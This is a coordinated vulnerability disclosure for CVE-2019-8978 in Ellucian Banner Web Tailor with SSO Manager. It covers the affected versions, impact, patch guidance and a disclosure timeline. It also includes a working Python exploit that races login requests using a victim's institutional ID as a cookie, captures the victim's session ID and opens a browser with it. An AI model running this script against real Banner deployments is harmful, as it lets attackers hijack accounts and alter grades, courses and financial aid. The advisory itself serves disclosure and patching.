# [CVE-2019-8978] Improper Authentication (CWE-287) in Ellucian Banner Web Tailor and Banner Enterprise Identity Services
Author: Joshua Mulliken <joshua@mulliken.net>

Thanks to: Carnegie Mellon University CERT Coordination Center

## Information
* Date Found: Dec. 17, 2018
* Vendor: Ellucian Company L.P.
* Vendor Homepage: https://www.ellucian.com
* Products: Banner Web Tailor and Banner Enterprise Identity Services
* Web Tailor Affected Versions: 8.8.3, 8.8.4, 8.9
* Banner Enterprise Identity Services Affected Versions: 8.3, 8.3.1, 8.3.2, 8.4
* CVE: CVE-2019-8978

## Table of Contents

1. Executive Summary

2. Product

3. Impact and Recommendations
   
   a. Impact
   
   b. Recommendations
   
4. Technical Details
   
   a. Technical Description
   
   b. Exploit Code
   
5. Disclosure Time-line

6. References

## 1. Executive Summary

An improper authentication vulnerability (CWE-287) was identified in Banner Web Tailor and Banner Enterprise Identity Services. This vulnerability is produced when SSO Manager is used as the authentication mechanism for Web Tailor, where this could lead to information disclosure and loss of data integrity for the impacted user(s). The vendor has verified the vulnerability and produced a patch that is now available. For more information see the postings on Ellucian Communities: [LINK NOT PROVIDED BEFORE DEADLINE] and Banner Enterprise Identity Services: [LINK NOT PROVIDED BEFORE DEADLINE]. UPDATE: Here’s the link to the IAM section: https://ecommunities.ellucian.com/message/252749#252749 And this is the link to the Banner Web Tailor and SSO Manager Vulnerability communication posted in the Banner General & Banner Technical Community space - https://ecommunities.ellucian.com/message/252810#252810[1]

## 2. Product

Banner Web Tailor is a web tool, made for higher education institutions, that provides registration, curriculum management, advising, administration, and reporting functionality. Students are able to access and change their registration, graduation, and financial aid information. Professors and teachers are able to input final grades and manage their courses. Administrators are able to access and change student and teacher information. It is used by hundreds of institutions, many of which have opted to use the Single Sign-on Manager in order to participate in CAS- and SAML-based single sign-on services. [2]

## 3. Impact and Recommendations

### A. Impact

A user's unique identifier, UDCID, is leaked via a cookie and it could lead to account compromise if this identifier is captured or otherwise known, in the case tested the UDCID was known to be the institutional ID printed on ID cards. The UDCID could be used to exploit a race condition that would provide an attacker with unauthorized access. For a student, the attacker could drop them from their courses, reject financial aid, change their personal information, etc. For a professor, this could lead to an inability to manage their courses, allow a malicious student to put in false final grades, etc. For an administrator, an attacker could change users information, place false holds on student accounts, etc.

### B. Recommendations

Organizations affected should update to the latest version. More information can be found in the postings on Ellucian Communities: [LINK NOT PROVIDED BEFORE DEADLINE] and Banner Enterprise Identity Services: [LINK NOT PROVIDED BEFORE DEADLINE] UPDATE: Here’s the link to the IAM section: https://ecommunities.ellucian.com/message/252749#252749 And this is the link to the Banner Web Tailor and SSO Manager Vulnerability communication posted in the Banner General & Banner Technical Community space - https://ecommunities.ellucian.com/message/252810#252810. Please utilize Ellucian Communities or contact Ellucian through ActionLine to get more information. Updates to this disclosure will be avaliable on GitHub: https://github.com/JoshuaMulliken/CVE-2019-8978

## 4. Technical Details

### A. Technical Description

The improper authentication vulnerability can be exploited through a race condition that occurs in Ellucian Banner Web Tailor, in conjunction with SSO Manager. This vulnerability allows remote attackers to steal a victim's session (and cause a denial of service) by repeatedly requesting the initial Banner Web Tailor main page with the IDMSESSID cookie set to the victim's UDCID, which in the case tested is the institutional ID. During a login attempt by a victim, the attacker can leverage the race condition and will be issued the SESSID that was meant for this victim. See proof of concept code located at the GitHub link below for more details.

### B. Exploit Code

```python
""" exploit.py
This code is designed for Python 3 and requires the packages selenium and requests_threads. It does 50 simultaneous requests per batch and repeats. More or less may be required depending on your connection latency.
"""

import re, time, sys, select, os

from selenium import webdriver
from requests_threads import AsyncSession

requests_per_batch = 50

target_host = input("Please provide the target url (This is from the Web Tailor page post login): ")

target_id = input("Please provide the ID, which in the case tested is the institutional ID: ")

cookies = {
    'IDMSESSID': target_id,
}

session = AsyncSession(n=requests_per_batch)

async def _main():
    final_sessid = ""
    os.system('cls' if os.name == 'nt' else 'clear')
    print("To quit press Enter")
    while True:
        rs = []

        for _ in range(requests_per_batch):
            rs.append(await session.get(target_host, cookies=cookies))

        for response in rs:
            for c in response.cookies:
                if (c.name == 'SESSID'):
                    print(c.name, c.value)
                    final_sessid = c.value

        if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            line = input()
            break

    print("Last SESSID:", final_sessid)

    open_browser = input("Open a browser with this SESSID(y/n): ")
    if open_browser == "y":
    	"""
    	This feature requires a chromedriver for your operating system version. 
    	It can be found at https://sites.google.com/a/chromium.org/chromedriver/
    	Place it in the working directory of the exploit.py
    	"""
        browser = webdriver.Chrome(executable_path=os.path.join(os.getcwd(),"chromedriver"))

        browser.get(target_host)
        browser.add_cookie({
            "domain": target_host.split("/")[2],
            "name": "SESSID",
            "value": final_sessid,
            })
        browser.get(target_host)

        stay_open = input("Press enter to close")


session.run(_main)
```

## 5. Disclosure Timeline

December 18, 2018: Attempted reporting through Ellucian's marketing web-form and sent to informationsecurityassessmentteam@ellucian.com

December 20, 2018: Submitted report to CERT Coordination Center at Carnegie Mellon University

January 2, 2019: Submitted report to a CISO at Ellucian who was discovered through LinkedIn

January 2, 2019: Requested information on responsible disclosure procedure from the University of South Carolina

January 3, 2019: Was told to report through ActionLine by Ellucian 

January 4, 2019: Was told by the University of South Carolina that there is no procedure for reporting vulnerabilities

January 4, 2019: Told the University of South Carolina that I had discovered a vulnerability in Banner

February 18, 2019: CERT informed me of failure to reach the vendor and advised me to publicly disclose

February 25, 2019: Sent draft of advisory to Ellucian and set the date of disclosure to March 4th.

February 28, 2019: Ran demo of vulnerability for Ellucian over Zoom conference

March 1, 2019: Was asked by the University of South Carolina to delay publication

March 21, 2019: The University of South Carolina received a backported patch from Ellucian

March 26, 2019: Ellucian finalized patches for all versions

March 29, 2019: Was told by Ellucian that the University of South Carolina would be doing changes on the 1st of April

April 1, 2019: Requested information on patch status from the University of South Carolina

April 5, 2019: The University of South Carolina gave ETA of April 30, 2019

April 30, 2019: The University of South Carolina updated ETA to the middle of May

May 7, 2019: Set publication date of disclosure to May 13

May 10, 2019: The University of South Carolina posted a planned outage notice for all Banner Services scheduled for May 11

May 11, 2019: The University of South Carolina successfully installed the patch

May 13, 2019: Disclosure published

## 6. References

[1. https://cwe.mitre.org/data/definitions/287.html](https://cwe.mitre.org/data/definitions/287.html)

[2. https://cwe.mitre.org/data/definitions/287.html](https://www.ellucian.com/solutions/ellucian-banner-student)
